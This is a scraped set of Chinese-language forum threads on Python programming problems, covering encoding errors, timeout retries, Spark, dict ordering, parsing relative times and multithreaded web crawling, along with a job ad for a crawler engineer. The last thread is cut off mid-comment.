{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码</p>\n<pre><code>fo = open(_filepath, \"w\")\nprint (\"文件名: \", fo.name)\nfo.write(txtData)\nfo.close()\n</code></pre>\n<p>fo.write(txtData)报错</p>\n<p><code>UnicodeEncodeError: 'gbk' codec can't encode character '\\u2764' in position 9870: illegal multibyte sequence</code></p>\n<p>'\\u2764'我转了编码后发现是❤</p>\n<p><img alt=\"\" src=\"http://i.imgur.com/hddvuWZ.png\"></p>\n</div></div>"], "reply": "11", "tittle": "因为一个心形符号“❤”导致保存失败怎么办", "comment": ["txtData 是从网上抓的中文小说", "为什么这个心还能显示红色？？？", " 设备字体问题", " 我的 iphone 也是", "不要转成国标码，直接存 UTF-8", " 谢谢，解决了", "🐥🐥🐥\r", "原来如此", "gbk 里面没有定义♥️", " 懂了谢谢(*￣︶￣)", "一般没什么特殊的，统一用 utf-8,我是这样做的", "utf8mb4 ，还可以保存 emoji 表情，微信的昵称"]},
{"content": ["<div class=\"topic_content\">各位亲爱的爬虫同学，我们 shein 公司在招高级爬虫开发工程师 [ 15k-20k ] ； shein 是跨境电商公司，五天七小时、下午茶、季度旅游、半年一次涨薪，坐标深圳南山大学城。有意者可投递简历至 <a target=\"_blank\" href=\"mailto:wgxin@dotfashion.cn\">wgxin@dotfashion.cn</a> 或者微信 13226230923\r<br>\r<br>职位诱惑：\r<br>独立带项目,上升空间,年轻团队,5 天 7 小时\r<br>工作描述：\r<br>1 、负责常规商品爬取工作；\r<br>2 、负责分布式爬虫的开发以及维护；\r<br>3 、负责基本的数据分析以及处理；\r<br>4 、开发更具实时性以及准确性的高性能爬虫；\r<br>5 、负责制定与规范整个爬取流程的优化。\r<br>\r<br>职位要求：\r<br>1 、本科以上学历，计算机相关专业，至少 2 年及以上爬虫开发经验，熟悉 python 语言，熟悉 javascript ；\r<br>2 、熟悉 redis ，能够通过使用 redis 来进行整个爬虫的分布式设计；\r<br>3 、熟悉 mongodb ，知道如何对其进行读写分离以及分布式部署；</div>"], "reply": "11", "tittle": "有爬虫小伙伴想 涨涨薪 换个环境工作吗？", "comment": ["半年一次涨薪？确定没说错？", "补一句：熟悉 Scrapy 是加分项", "招应届毕业生（普通一本）吗，已经做了大半年 Python 爬虫工程师实习，工资可以要少点，目前在魔都", "发错区了吧", " 这个区人气旺一点哈哈", "独立带项目对写爬虫的职位诱惑不是加分项，这个个人体会\r", "\r", "其次根据业务来说，这个技术栈有点 naive", " 一次涨 200 ，不行么？", "20k 封顶， Python 高级这么便宜了啊", "这个工资对得起这个要求，但是这个工资不是高级工程师的 level", " \r", "\r", " \r", "高级爬虫开发工程师, 看清楚，不是 xx 语言高级工程师", "爬虫领域高级的话 底薪 20K 都低 已经和语言无关了 \r", "在往上就是分布式云爬虫 调度负载"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一段为 POST 获取数据的代码，</p>\n<pre><code>#! /usr/local/python3\nimport urllib\nimport http\nimport time\nimport socket\n\ntimeout = 10\nsocket.setdefaulttimeout(timeout)\n\n\ndef up_post(username, password, page):\n    data = {'username': username, 'password' : password}\n    url = r\"http://192.168.2.8/?page\" + page\n    postdata = bytes(urllib.parse.urlencode(data), encoding='gbk')\n    response = urllib.request.urlopen(url, data=postdata)\n    text = response.read().decode('gbk')\n    print(text)\n    if text.find(\"成功\") != -1:\n        return page + \":\" + text\n    else:\n        return page + \":error\"\n\nusername = \"aaa\"\npassword = \"bbb\"\npage = 1\nwhile page &lt;= 99:\n    try:\n        static = up_post(username, password, page)\n    except ( http.client.IncompleteRead, urllib.error.URLError, socket.timeout, ConnectionResetError) as e:\n        time.sleep(5)\n        static = up_post(username, password, page)\n        while True:\n            if static == page + \":\" + static or static == page + \":error\" or static == \"\":\n                break\n</code></pre>\n<p>运行一段时间过后，会连续提示两个 timed out ：</p>\n<pre><code>Traceback (most recent call last):\n  File \"mvc.py\", line 103, in &lt;module&gt;\n    static = up_post(username, password, page)\n  File \"mvc.py\", line 27, in lan_up_post\n    response = urllib.request.urlopen(url, data=postdata)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 223, in urlopen\n    return opener.open(url, data, timeout)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 526, in open\n    response = self._open(req, data)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 544, in _open\n    '_open', req)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 504, in _call_chain\n    result = func(*args)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 1346, in http_open\n    return self.do_open( http.client.HTTPConnection, req)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 1321, in do_open\n    r = h.getresponse()\n  File \"/usr/local/lib/python3.6/http/client.py\", line 1331, in getresponse\n    response.begin()\n  File \"/usr/local/lib/python3.6/http/client.py\", line 297, in begin\n    version, status, reason = self._read_status()\n  File \"/usr/local/lib/python3.6/http/client.py\", line 258, in _read_status\n    line = str(self.fp.readline(_MAXLINE + 1), \"iso-8859-1\")\n  File \"/usr/local/lib/python3.6/socket.py\", line 586, in readinto\n    return self._sock.recv_into(b)\nsocket.timeout: timed out\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"mvc.py\", line 106, in &lt;module&gt;\n    static = up_post(username, password, page)\n  File \"mvc.py\", line 27, in lan_up_post\n    response = urllib.request.urlopen(url, data=postdata)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 223, in urlopen\n    return opener.open(url, data, timeout)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 526, in open\n    response = self._open(req, data)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 544, in _open\n    '_open', req)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 504, in _call_chain\n    result = func(*args)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 1346, in http_open\n    return self.do_open( http.client.HTTPConnection, req)\n  File \"/usr/local/lib/python3.6/urllib/request.py\", line 1321, in do_open\n    r = h.getresponse()\n  File \"/usr/local/lib/python3.6/http/client.py\", line 1331, in getresponse\n    response.begin()\n  File \"/usr/local/lib/python3.6/http/client.py\", line 297, in begin\n    version, status, reason = self._read_status()\n  File \"/usr/local/lib/python3.6/http/client.py\", line 258, in _read_status\n    line = str(self.fp.readline(_MAXLINE + 1), \"iso-8859-1\")\n  File \"/usr/local/lib/python3.6/socket.py\", line 586, in readinto\n    return self._sock.recv_into(b)\nsocket.timeout: timed out\n</code></pre>\n<p>超时处理我只会 sleep 以后再重新运行一次获取代码，但是还是会出现两个 timed out 然后强行终止程序。</p>\n<p>它提示 timed out 可以，但是我不想让它强行终止程序，我想让它不断重试！</p>\n<p>咋搞啊？</p>\n</div></div>", "<div class=\"topic_content\">已经用了 #3 推荐的 retrying ，不错挺好用的！</div>"], "reply": "13", "tittle": "Python3 如何正确处理超时并重试？", "comment": ["把外部调用的函数加个装饰器，捕获异常并重试", "这节点没有 APPEND 嘛？\r", "我突然发现，似乎\r", "            if static == page + \":\" + static or static == page + \":error\" or static == \"\":\r", "                break\r", "并没有用啊。\r", "加不加都会 timed out", "可以用 ", "循环 try catch 呗", "最好设置个最高重试次数", "用 2 层循环？\r", "while page <= 99:\r", "      gotData = False\r", "      reTry = 1\r", "      while reTry < 5 and not gotData:\r", "          try:\r", "              reTry += 1\r", "              static = up_post()\r", "              gotData = True\r", "          except:\r", "              pass", "while try catch timeout break", "有个包叫做 retry ，可以试一下", " 这个方法好", "web 请求函数单独摘出来，手动捕获超时，超时就递归请求，正常就返回，还可以传一个最大尝试次数的参数", "requests 库有 timeout 选项的", "requests 有 timeout 和 retry 的配置。可以分别设置连接超时和读取超时。", " 对，我一直用这个库"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>已经是 root 用户了，不知道为啥还报 Operation not permitted</p>\n<p>MacOS 10.12.3 ， Python 2.7.10</p>\n<pre><code>root# pip install -U pip setuptools\nRequirement already up-to-date: pip in /Library/Python/2.7/site-packages\nCollecting setuptools\n  Using cached setuptools-34.3.0-py2.py3-none-any.whl\nCollecting packaging&gt;=16.8 (from setuptools)\n  Using cached packaging-16.8-py2.py3-none-any.whl\nCollecting appdirs&gt;=1.4.0 (from setuptools)\n  Using cached appdirs-1.4.1-py2.py3-none-any.whl\nCollecting six&gt;=1.6.0 (from setuptools)\n  Using cached six-1.10.0-py2.py3-none-any.whl\nCollecting pyparsing (from packaging&gt;=16.8-&gt;setuptools)\n  Using cached pyparsing-2.1.10-py2.py3-none-any.whl\nInstalling collected packages: six, pyparsing, packaging, appdirs, setuptools\n  Found existing installation: six 1.4.1\n    DEPRECATION: Uninstalling a distutils installed project (six) has been deprecated and will be removed in a future version. This is due to the fact that uninstalling a distutils project will only partially uninstall the project.\n    Uninstalling six-1.4.1:\nException:\nTraceback (most recent call last):\n  File \"/Library/Python/2.7/site-packages/pip/basecommand.py\", line 215, in main\n    status = self.run(options, args)\n  File \"/Library/Python/2.7/site-packages/pip/commands/install.py\", line 342, in run\n    prefix=options.prefix_path,\n  File \"/Library/Python/2.7/site-packages/pip/req/req_set.py\", line 778, in install\n    requirement.uninstall(auto_confirm=True)\n  File \"/Library/Python/2.7/site-packages/pip/req/req_install.py\", line 754, in uninstall\n    paths_to_remove.remove(auto_confirm)\n  File \"/Library/Python/2.7/site-packages/pip/req/req_uninstall.py\", line 115, in remove\n    renames(path, new_path)\n  File \"/Library/Python/2.7/site-packages/pip/utils/__init__.py\", line 267, in renames\n    shutil.move(old, new)\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/shutil.py\", line 302, in move\n    copy2(src, real_dst)\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/shutil.py\", line 131, in copy2\n    copystat(src, dst)\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/shutil.py\", line 103, in copystat\n    os.chflags(dst, st.st_flags)\nOSError: [Errno 1] Operation not permitted: '/tmp/pip-fZIEx5-uninstall/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/six-1.4.1-py2.7.egg-info'\n</code></pre>\n</div></div>"], "reply": "6", "tittle": "MAC 下升级 setuptools 失败", "comment": ["sudo pip install setuptools --upgrade", " #1 同样的报错，-U 和--upgrade 有区别吗", "我也遇到过这个问题，解决方法貌似是检查 python 目录和 six-1.4.1 … egg-info 文件相应用户（你个人用户和 root ）的写权限。不要指望通过 root 来完成一些本应不被允许的操作", " #3 个人账户也无法安装\r", "six-1.4.1 … egg-info 文件相应用户，这个文件是在什么地方", " 就是 Operation not permitted 的那个文件", " #5 这个文件应该是临时生成的，每次安装都不一样"]},
{"content": ["<div class=\"topic_content\">最近在看 spark ，写了一些东西，但对于 spark 这套东西了解的还是太少，求各位 dalao 指导\r<br>\r<br>现在的情况是这样的：\r<br>我有 40G 左右的文本文件需要处理并分析：\r<br>我现在用的鲁莽的方法：\r<br>sc.wholeTextFiles--读完\r<br>map--让这些处理的中间结果存到 mongodb 中\r<br>reduce--再从 mongodb 中读东西进行分析\r<br>因为中间结果是很多数组有些复杂，所以我才想用 mongodb 存\r<br>\r<br>我的疑问是这样的：\r<br>\r<br>听说从本地直接读文件效率很低，要把这些文件先 put 到 hdfs 上吗？\r<br>\r<br>spark 似乎提供了类似 mongodb 的可用的数据库？用它这个更好？</div>"], "reply": "17", "tittle": "不懂就要问， pyspark", "comment": ["pandas 就够了", "中间不要把文件落地，直接 reduce.", "我是 scala 党 思路是这样的 你把你的大文件分割成 10 分 开十个机器 这样去读速度会快很多", " 本来我觉得也是啊，奈何这关系到一个课程作业...", " 中间结果必须要存的，因为将来要反复 reduce 这些东西，类似搜索，我的担心是存 mongodb 里是不是对 spark 的性能有很大影响", " 好的，我再看看 spark 的 dataframe~看能不能把中间结果用它的 df 存", "少年,这些我都用过,没有什么复杂的数据结构是 spark dataframe 或者 spark-sql 处理不了的", "开始的是时候，把文件上传到 HDFS 。比较简单的办法是把「中间结果」 encode 一下，存到 HDFS 。\r", "二次读取完了直接 decode 一下，然后处理就好了。", " 反正中间就是 df 然后随便转换就行读文件耗时 中间网络传输也是瓶颈", "中间为什么要手动存呢，如果你想保存中间结果，不是用 spark 的 cache 比较好么？", " 我也很想用啊，也很苦恼", " 嗯，我也是这样想的", " spark 新手，我也很苦恼的，存 mongodb 的方便在于其他地方要调用这些比较方便，", " 感觉 pyspark 的文档有些复杂，虽然感觉也能草草用用，但总感觉不靠谱", "反复存取， mongodb 小心耗尽硬盘", " 是的 所以用的 Scala 版本 另外可以考虑用 zeppelin 进行数据分析", "业界人士建议，如果一定要存中间结果，存成 parquet 。"]},
{"content": ["<div class=\"topic_content\">d={‘ a ’=1,'b'=5,'c'=2}\r<br>for value in d.itervalue():\r<br>  print value \r<br>这个输出的是 1 2 5\r<br>而 d={‘ a ’=1,'c'=5,'b'=2}\r<br>for value in d.itervalue():\r<br>  print value \r<br>这输出的是 1,5,2\r<br>这是为什么呢</div>"], "reply": "9", "tittle": "初学者的 Python 问题，自己想不明白", "comment": ["问题是 dict 迭代的顺序问题么\r", "\r", "首先要搜一下 dict 的输出是按什么顺序.\r", "\r", "然后还可以进一步, 看自己构造的 2 个 dict 用相同 k-v, 是一样的对象?", " 哦 是因为 dict 是无序的吗", " python3.6 之前,dict 是无序的, 3.6 改了实现，是有序的", "和 itervalue 怎么实现的有关吧，看楼主 print 的架势似乎是 python2 ？", "关于遍历的顺序, 一般语言都会写上不保证顺序吧", "[img]http://oh8j3x4bt.bkt.gdipper.com/20170225004840_7DWrSl_Screenshot.jpeg[/img]", "老的 dict 是 hash ，无序。想要有顺序可以导入\r", "OrderedDict 。\r", "\r", "最新版本改成有序的了。", "好的 谢谢各位了"]},
{"content": ["<div class=\"topic_content\">爬到如题的一些关于时间的描述，不知道如何转换为当前计算机的时间</div>", "<div class=\"topic_content\">听大家说想想也对， x 分钟前， x 小时前当作当天处理， x 天前减去 x 天， x 星期前就减去 7 乘 x ，再往后就是 yyyy-mm-dd 的格式，就好处理了，多谢大家</div>"], "reply": "48", "tittle": "如何处理诸如“5 分钟前”“3 小时前”“两天前”这样的时间", "comment": ["页面源码应该是时间，用 js 改的相对时间", "js 可以用 moment.js", " 并没有", "那么简单的文法，手写一下 parser 咯，前段时间刚好写了个简单的 lexer 和 parser\r", " Don't panic, :)", "懒的后端不写直接传 json 带时间戳\r", "前端 js 转换 if 判断\r", "勤快点的就后台梳理这么写的\r", "反正我就是这么写的\r", "\r", "不知道你为啥有这个需求。。。", " 我也很无奈啊", "爬虫爬取网页会遇到这样的处理需求。没查过有没有现成轮子，要自己写的话就是匹配一下文字再转换就可以了", "我没有写过爬虫，但如果可能，直接爬服务器返回的 json ，时间戳一般可以在里面找到。我写后端的时候就返回时间戳，到了前端我会用 moment.js 转成“ 3 小时前”之类的表达", "实际上你爬虫爬这种数据，多半能在目标附近找到一个标准时间或者是时间戳。\r", "\r", "可以简单 parse 一下，然后用 pytime 这个库走一波就行了。", "如果可以到数据库，那么同时保存一个入库时间，用 sql 处理>入库时间减去'N'分钟 where 包含 '分钟前'\r", " 以此类推就可以了", " 很可惜是写死在网页里的", "你是不是抓的视频网站。。。。", " 我是爬到的数据😂", "python arrow", "那就 同时获取你爬取到那条数据的时间，然后减去 'X 小时' 就可以了。就是要加个计算，我目前就是这样在数据库层面离线处理", " 你看网站 HTML 源码是写死的 但有没有查过 Chrome dev tool 里面的 network 标签？如果这里面也没有那只能肯定那个是后端处理了。即使你通过转换，得到的时间都只是大概的", "没看认真题主问题 - -， 忽略我。。。", " 刚写了一个工具，用来将自然语言中的时间信息提取出来，再转化成具体的时间，可以参考一下：\r", " 嗯，确认了\r", "嘛，至少比日期精确", "我更喜欢 shell", "strtotime     php 是世界上最好的语言", "自己算一下呗，算个大概时间", "总共就那些固定格式，收集、判断、提取字符串转换下即可", "做好了可以传到 pip 或者 GitHub 上~ 应该不少人会用到", "已经有人说过了 我再说一遍  php 是最好的语言..", "具体分析下咯\r", "看看这个内容的背后是什么机制驱动的，如果是纯前端，多半在什么地方有时间戳，只要数据不是藏在闭包里，还是有机会拿到的\r", "实在不行，要求不是那么精确的话，根据文法用正则翻译一下\r", "如“一小时以前”可以变成 date.today() - timedelta(hours = 1)什么的", "写个 strtotime 的 PHP 脚本， Python 里调用 PHP 脚本获取结果，（逃", " v2 的也包含时间戳么？", "因为最终大多数都变成多少天前，所以你这个数据的精度要不了那么高吧，直接算日子，省略时间吧", " 😂说得也是", " 没仔细研究，看上去是没有实时更新的。不过精确到分钟，想来精度是够用的。", " 是用 arrow.get 么...", "这里其实隐含了另一个问题：“ 5 分钟前”“ 3 小时前”“两天前”表示的精度是不一样的，都转化成一个精确到秒且没有其他信息的数据并不合适。", " php 有更好的实现， Carbon", "我觉得问题在于不同的网站都各有一套显示规则,还不止这个显示方式,新闻抓取就这毛病", "竟然有人妄图让后端转换这些东西。。。如果在实际项目里，后端转换了，这个项目就废了", " 看需求，如果爬下来的数据是要离线分析用， ETL 时处理也没什么", "在爬 weibo 的数据时也遇到这个问题，以前的 json 接口带时间戳，不过那个接口废了，新接口只有这样的时间", "如果爬的够勤快，理论上只需要处理分钟即可", " 通常就是后端转换的啊", " 比如最方便的 Rails 直接提供 time_ago_in_words 方法…", " php 不愧是最好的语言", "Python 可以用 pendulum\r", "\r", "\r", "```\r", ">>> past = pendulum.now().subtract(minutes=2)\r", ">>> past.diff_for_humans()\r", ">>> '2 minutes ago'\r", "```", " 昂...我是要逆转换", "爬附件的上传时间"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题</p>\n<ol>\n<li>当程序执行一段时间后就卡死了</li>\n<li>为什么一开始频繁的使用几个线程？（下方 LOG ）</li>\n<li>为什么先获取一段时间，然后再存储？如何才能交叉执行？</li>\n<li>为什么最后只有线程 16 在工作？</li>\n<li>下方代码如何修改才能将多线程做到最佳？(写的第一个多线程程序，小白了)\n代码:</li>\n</ol>\n<pre><code># coding: utf-8\n\nimport requests\nfrom pyquery import PyQuery\nimport threading\nimport queue\n\nclass Douyu(threading.Thread):\n    def __init__(self, directory_queue, thread_name):\n        self.thread_name = thread_name\n        self.directory_queue = directory_queue\n        self.rooms_queue = queue.Queue()\n        self.lock = threading.Lock()\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.get_rooms()\n        self.lock.acquire()\n        self.save_data()\n        self.lock.release()\n\n    def get_rooms(self):\n        while not self.directory_queue.empty():\n            directory_info = self.directory_queue.get_nowait()\n            html = requests.get(directory_info['url']).text\n            pq = PyQuery(html)\n            size = pq.find('#live-list-contentbox &gt; li').size()\n            for index in range(size):\n                item = pq.find('#live-list-contentbox &gt; li').eq(index)\n                title = item.find('a').attr('title')\n                url = 'http://www.douyu.com' + item.find('a').attr('href')\n                streamer = item.find('.dy-name').text()\n                directory = directory_info['name']\n                viewers = item.find('.dy-num').text()\n                self.rooms_queue.put({\n                    'title': title,\n                    'url': url,\n                    'streamer': streamer,\n                    'directory': directory,\n                    'viewers': viewers\n                })\n                print('[%s] 获得房间: %s' %(self.thread_name, url))\n\n    def save_data(self):\n        while self.rooms_queue.not_empty:\n            room_info = self.rooms_queue.get()\n            content = '房间标题 =&gt; %s\\n 主播名称 =&gt; %s\\n 观众数量 =&gt; %s\\n 分类栏目 =&gt; %s\\n 房间链接 =&gt; %s\\n\\n' \\\n                      % (room_info['title'], room_info['streamer'], room_info['viewers'], room_info['directory'], room_info['url'])\n            with open('result.txt', 'a', encoding='utf-8') as f:\n                f.write(content)\n                print('[%s] 存储房间: %s' %(self.thread_name, room_info['url']))\n\ndef get_director():\n    directory_queue = queue.Queue()\n    html = requests.get('http://www.douyu.com/directory').text\n    pq = PyQuery(html)\n    size = pq.find('.unit').size()\n    for index in range(size):\n        item = pq.find('.unit').eq(index)\n        name = item.find('p').text()\n        url = item.find('a').attr('href')\n        img = item.find('img').attr('data-original')\n        directory_queue.put({\n            'name': name,\n            'url': 'http://www.douyu.com' + url,\n            'img': img\n        })\n    return directory_queue\n\nif __name__ == '__main__':\n    thread_num = 20\n    threads = []\n    directory_queue = get_director()\n    for t in range(thread_num):\n        douyu = Douyu(directory_queue, '线程%s' %str(t+1))\n        print('[线程%s] 开启线程' %str(t+1))\n        douyu.setDaemon(True)\n        douyu.start()\n        threads.append(douyu)\n    for t in threads:\n        t.join()\n</code></pre>\n<p>LOG(分别截取了开始、中间和最后的 LOG):</p>\n<pre><code>[线程 1] 获得房间: http://www.douyu.com/889024\n[线程 1] 获得房间: http://www.douyu.com/1397153\n[线程 1] 获得房间: http://www.douyu.com/110441\n[线程 1] 获得房间: http://www.douyu.com/134000\n[线程 1] 获得房间: http://www.douyu.com/854503\n[线程 3] 获得房间: http://www.douyu.com/220185\n[线程 1] 获得房间: http://www.douyu.com/796666\n[线程 1] 获得房间: http://www.douyu.com/1495611\n[线程 3] 获得房间: http://www.douyu.com/312410\n[线程 1] 获得房间: http://www.douyu.com/1061949\n[线程 3] 获得房间: http://www.douyu.com/281276\n[线程 6] 获得房间: http://www.douyu.com/659980\n[线程 1] 获得房间: http://www.douyu.com/142823\n[线程 3] 获得房间: http://www.douyu.com/127810\n[线程 6] 获得房间: http://www.douyu.com/82961\n[线程 3] 获得房间: http://www.douyu.com/lslalala\n[线程 6] 获得房间: http://www.douyu.com/yiyi0409\n[线程 1] 获得房间: http://www.douyu.com/860272\n[线程 3] 获得房间: http://www.douyu.com/85513\n[线程 6] 获得房间: http://www.douyu.com/222679\n[线程 1] 获得房间: http://www.douyu.com/529719\n[线程 1] 获得房间: http://www.douyu.com/1076249\n[线程 3] 获得房间: http://www.douyu.com/yilingshu\n[线程 6] 获得房间: http://www.douyu.com/548317\n--------------------------------------------\n[线程 1] 存储房间: http://www.douyu.com/668493\n[线程 8] 存储房间: http://www.douyu.com/1687725\n[线程 7] 存储房间: http://www.douyu.com/yueguanggugu\n[线程 9] 存储房间: http://www.douyu.com/1756041\n[线程 1] 存储房间: http://www.douyu.com/1055977\n[线程 8] 存储房间: http://www.douyu.com/1728922\n[线程 9] 存储房间: http://www.douyu.com/1646520\n[线程 7] 存储房间: http://www.douyu.com/1658595\n[线程 1] 存储房间: http://www.douyu.com/1298062\n[线程 19] 获得房间: http://www.douyu.com/1380833\n[线程 5] 获得房间: http://www.douyu.com/1001504\n[线程 7] 存储房间: http://www.douyu.com/1480669\n[线程 9] 存储房间: http://www.douyu.com/zijintv\n[线程 8] 存储房间: http://www.douyu.com/327140\n[线程 1] 存储房间: http://www.douyu.com/1733204\n[线程 7] 存储房间: http://www.douyu.com/318812\n[线程 8] 存储房间: http://www.douyu.com/550538\n[线程 9] 存储房间: http://www.douyu.com/1089301\n[线程 1] 存储房间: http://www.douyu.com/1529776\n[线程 7] 存储房间: http://www.douyu.com/psp968968\n[线程 19] 获得房间: http://www.douyu.com/1569173\n[线程 8] 存储房间: http://www.douyu.com/697983\n[线程 1] 存储房间: http://www.douyu.com/keer\n[线程 19] 存储房间: http://www.douyu.com/thp\n[线程 9] 存储房间: http://www.douyu.com/1652743\n[线程 7] 存储房间: http://www.douyu.com/xiaoermi\n[线程 5] 获得房间: http://www.douyu.com/qldyu\n[线程 8] 存储房间: http://www.douyu.com/dayage\n[线程 1] 存储房间: http://www.douyu.com/921537\n[线程 19] 存储房间: http://www.douyu.com/rentoudage\n[线程 7] 存储房间: http://www.douyu.com/1448875\n[线程 9] 存储房间: http://www.douyu.com/1586681\n[线程 8] 存储房间: http://www.douyu.com/ACE4j4f\n[线程 1] 存储房间: http://www.douyu.com/101581\n[线程 9] 存储房间: http://www.douyu.com/688037\n[线程 19] 存储房间: http://www.douyu.com/beizile\n[线程 7] 存储房间: http://www.douyu.com/SuperDongGua\n[线程 8] 存储房间: http://www.douyu.com/1632941\n[线程 5] 获得房间: http://www.douyu.com/638494\n[线程 9] 存储房间: http://www.douyu.com/1480484\n[线程 19] 存储房间: http://www.douyu.com/1707082\n[线程 1] 存储房间: http://www.douyu.com/dandansimida\n[线程 7] 存储房间: http://www.douyu.com/234796\n[线程 8] 存储房间: http://www.douyu.com/biersi\n[线程 9] 存储房间: http://www.douyu.com/973430\n[线程 8] 存储房间: http://www.douyu.com/700699\n[线程 1] 存储房间: http://www.douyu.com/1704340\n[线程 7] 存储房间: http://www.douyu.com/431834\n[线程 19] 存储房间: http://www.douyu.com/hekang26\n[线程 9] 存储房间: http://www.douyu.com/1448831\n[线程 8] 存储房间: http://www.douyu.com/1056129\n--------------------------------------------\n[线程 16] 存储房间: http://www.douyu.com/1752254\n[线程 16] 存储房间: http://www.douyu.com/432194\n[线程 16] 存储房间: http://www.douyu.com/1022771\n[线程 16] 存储房间: http://www.douyu.com/1433889\n[线程 16] 存储房间: http://www.douyu.com/1507464\n[线程 16] 存储房间: http://www.douyu.com/1609845\n[线程 16] 存储房间: http://www.douyu.com/1714938\n[线程 16] 存储房间: http://www.douyu.com/1733278\n[线程 16] 存储房间: http://www.douyu.com/1733857\n[线程 16] 存储房间: http://www.douyu.com/1756482\n[线程 16] 存储房间: http://www.douyu.com/1762073\n[线程 16] 存储房间: http://www.douyu.com/1763143\n[线程 16] 存储房间: http://www.douyu.com/560975\n[线程 16] 存储房间: http://www.douyu.com/1107272\n[线程 16] 存储房间: http://www.douyu.com/1507653\n[线程 16] 存储房间: http://www.douyu.com/1696140\n[线程 16] 存储房间: http://www.douyu.com/1747240\n[线程 16] 存储房间: http://www.douyu.com/1756615\n[线程 16] 存储房间: http://www.douyu.com/1763597\n[线程 16] 存储房间: http://www.douyu.com/1576127\n[线程 16] 存储房间: http://www.douyu.com/1715281\n[线程 16] 存储房间: http://www.douyu.com/1751258\n[线程 16] 存储房间: http://www.douyu.com/289467\n[线程 16] 存储房间: http://www.douyu.com/588167\n[线程 16] 存储房间: http://www.douyu.com/992747\n[线程 16] 存储房间: http://www.douyu.com/441593\n[线程 16] 存储房间: http://www.douyu.com/wangjiayuan\n[线程 16] 存储房间: http://www.douyu.com/941643\n[线程 16] 存储房间: http://www.douyu.com/zgzx\n[线程 16] 存储房间: http://www.douyu.com/709507\n[线程 16] 存储房间: http://www.douyu.com/1157338\n[线程 16] 存储房间: http://www.douyu.com/1127329\n[线程 16] 存储房间: http://www.douyu.com/1584630\n[线程 16] 存储房间: http://www.douyu.com/1450321\n[线程 16] 存储房间: http://www.douyu.com/1642714\n[线程 16] 存储房间: http://www.douyu.com/1064505\n[线程 16] 存储房间: http://www.douyu.com/1146092\n[线程 16] 存储房间: http://www.douyu.com/680754\n[线程 16] 存储房间: http://www.douyu.com/69832\n[线程 16] 存储房间: http://www.douyu.com/1026872\n[线程 16] 存储房间: http://www.douyu.com/810070\n[线程 16] 存储房间: http://www.douyu.com/woshidaxiang\n[线程 16] 存储房间: http://www.douyu.com/607602\n[线程 16] 存储房间: http://www.douyu.com/1233613\n[线程 16] 存储房间: http://www.douyu.com/1635785\n[线程 16] 存储房间: http://www.douyu.com/1708780\n[线程 16] 存储房间: http://www.douyu.com/1729768\n[线程 16] 存储房间: http://www.douyu.com/726729\n[线程 16] 存储房间: http://www.douyu.com/1560522\n[线程 16] 存储房间: http://www.douyu.com/1055832\n[线程 16] 存储房间: http://www.douyu.com/1661439\n[线程 16] 存储房间: http://www.douyu.com/1727351\n[线程 16] 存储房间: http://www.douyu.com/1754653\n[线程 16] 存储房间: http://www.douyu.com/856456\n[线程 16] 存储房间: http://www.douyu.com/1344011\n[线程 16] 存储房间: http://www.douyu.com/1471174\n[线程 16] 存储房间: http://www.douyu.com/1763018\n[线程 16] 存储房间: http://www.douyu.com/428860\n[线程 16] 存储房间: http://www.douyu.com/692988\n[线程 16] 存储房间: http://www.douyu.com/63279\n[线程 16] 存储房间: http://www.douyu.com/dxyd\n[线程 16] 存储房间: http://www.douyu.com/1733399\n[线程 16] 存储房间: http://www.douyu.com/1091684\n[线程 16] 存储房间: http://www.douyu.com/1547628\n[线程 16] 存储房间: http://www.douyu.com/779076\n[线程 16] 存储房间: http://www.douyu.com/1251518\n[线程 16] 存储房间: http://www.douyu.com/1729363\n[线程 16] 存储房间: http://www.douyu.com/1056938\n[线程 16] 存储房间: http://www.douyu.com/balaosiji\n[线程 16] 存储房间: http://www.douyu.com/734565\n[线程 16] 存储房间: http://www.douyu.com/1478684\n[线程 16] 存储房间: http://www.douyu.com/1667059\n[线程 16] 存储房间: http://www.douyu.com/1459180\n[线程 16] 存储房间: http://www.douyu.com/caopan\n[线程 16] 存储房间: http://www.douyu.com/1064081\n[线程 16] 存储房间: http://www.douyu.com/554746\n</code></pre>\n</div></div>"], "reply": "16", "tittle": "Python 多线程爬虫的问题", "comment": ["既然想并发的话为什么不用 scrapy", "虽然你的问题我不知道具体的答案，但是要知道 CPython 是禁止多线程同时工作的，同一时刻只有一个线程在工作，遇到 I/O 才会切换到另一个线程。你这个程序每个线程每次都循环写入文件肯定是不合理的，需要优化。另外 Python 并发编程最合理的办法应该是不用多线程……", "多打一些 log ，尽可能找出每个线程是卡在哪一句上，曾经有过类似的经历，是因为某些线程卡在了 html parse 上，原本单线程很快的 cpu 操作变得异常的慢。后来把 parse 的操作解耦放到另一个进程里面就顺畅很多了。", "不是不推荐多线程？用子进程", "线程不是你想开多少就有多少，跟系统 cpu 有关。", "你不处理异常的吗？", "为什么一开始频繁的使用几个线程？线程是同时执行的\r", "为什么先获取一段时间，然后再存储？你自己这么写的，别人怎么知道为什么！\r", "为什么最后只有线程 16 在工作？你加锁了啊！\r", "下方代码如何修改才能将多线程做到最佳？不用多线程", "Python 有 GIL ，多线程不是很好用，一般使用协程做并发\r", "\r", "前几天看到一篇好文章，分享在此\r", "\r", "“从 0 到 1 ， Python 异步编程的演进之路”： ", "不对，我就不懂了，你这个 